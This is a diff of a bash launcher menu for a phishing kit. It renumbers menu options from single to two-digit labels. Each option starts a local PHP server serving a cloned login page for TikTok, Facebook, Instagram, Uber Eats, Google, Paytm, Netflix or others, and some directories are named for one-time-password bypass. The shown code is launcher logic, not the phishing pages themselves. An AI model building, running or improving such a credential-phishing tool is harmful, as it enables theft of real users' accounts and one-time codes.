@@ -60,7 +60,7 @@ echo ""
                  read -p $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m Enter Your Choice : \e[0m' option
 		 case $option in 
 			 
-                         1)cd sites/ 
+                         01)cd sites/ 
                            cd tiktok/
                            echo ""
                            echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
@@ -80,7 +80,7 @@ echo ""
 
                 ;;
 	        
-	        2)cd sites/
+	        02)cd sites/
                   cd facebook/
                   echo ""
                   echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
@@ -101,7 +101,7 @@ echo ""
 
                 ;;
 
-                3) cd sites/
+                03) cd sites/
                   cd instagram/
                   echo ""
                   echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
@@ -124,7 +124,7 @@ echo ""
                   
                 ;;
 
-                4)cd sites/
+                04)cd sites/
                   cd UberEats-Phishing/
                   echo ""
                   echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
@@ -146,7 +146,7 @@ echo ""
                   
                 ;;
                  
-                5) cd sites/
+                05) cd sites/
                   cd ola-otpbypass/
                   echo ""
                   echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
@@ -167,7 +167,7 @@ echo ""
                  
                 ;;
                 
-                6)cd sites/
+                06)cd sites/
                   cd google-otp/
                   echo ""
                   echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
@@ -189,7 +189,7 @@ echo ""
 
                 ;;
   
-                7)cd sites/
+                07)cd sites/
                   cd Paytm-Phishing/
                   echo ""
                  echo -e $'\e[1;33m[\e[0m\e[1;77m 1 \e[0m\e[1;33m]\e[0m\e[1;32m Paytm Sign In \e[0m' 
@@ -197,7 +197,7 @@ echo ""
                  echo ""
                  read -p $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m Enter Your Choice : \e[0m' option
 		 case $option in
-			 1) cd paytm/
+			 01) cd paytm/
                             echo ""
                             echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                             php -S 127.0.0.1:4444 > /dev/null 2>&1 &
@@ -216,7 +216,7 @@ echo ""
 
                 ;;
                 
-                         2) cd signup/
+                         02) cd signup/
                             echo ""
                             echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                             php -S 127.0.0.1:4444 > /dev/null 2>&1 &
@@ -236,7 +236,7 @@ echo ""
                 esac
                 ;;
 
-                8)cd sites/
+                08)cd sites/
                   cd Netflix/
                   echo ""
                   echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
@@ -257,7 +257,7 @@ echo ""
                 ;;
 
 
-               9)cd sites/
+               09)cd sites/
                   cd instafollow/
                   echo ""
                   echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
